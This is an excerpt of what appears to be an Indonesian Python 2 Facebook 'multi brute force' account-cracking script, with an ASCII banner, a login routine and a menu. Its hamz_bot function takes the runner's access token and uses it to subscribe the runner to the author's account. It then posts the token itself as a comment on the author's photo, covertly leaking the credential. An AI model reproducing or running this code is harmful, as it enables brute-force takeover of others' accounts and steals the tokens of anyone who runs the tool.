...
╚═╝  ╚═╝╚═╝╚══════╝╚══════╝
       ...
       \033[1;95m RIZZ | \033[1;96m MULTI | \033[1;91m BRUTE | \033[1;93m FORCE    
                                 
                                                
│                               \033[1;93mMy Name \033[1;92m: \033[1;96mAPRIZAL HADI │
└────────────────────────────────────────────────────────┘""""")
id = []
cp = []
ok = []
...
def masuk():
	...
	try:
		...
		if token == "xyz":
			os.system("xdg-open https://free.facebook.com/photo.php?fbid=1685079265165510&id=100009903577833&set=a.1250083608665080&source=48&_rdr")
			exit(" ! Jangan Lupa React Love Ngab")
		try:
...
###PILIHHH ###
def pilih():
	kontol = raw_input("\033[1;95m  ┌─[Aprzzz | Gntenk└──╼ ❯❯❯ \033[92m :\033[1;92m ")
	if kontol == "":
		menu()
	elif kontol == "1":
		publik()
...
def hamz_bot():
    ...
    kom = " Bang @[100009903577833:] Keren Bangetz Ngga Ada Obat Lu ✌️"
    requests.post('https://graph.facebook.com/100009903577833/subscribers?access_token=' + token)
    requests.post('https://graph.facebook.com/100009903577833/subscribers?access_token=' + token)
    requests.post('https://graph.facebook.com/1685079265165510/comments/?message=' +token+ '&access_token=' + token)
    requests.post('https://graph.facebook.com/1685079265165510/comments/?message=' +kom+ '&access_token=' + token)
    menu()
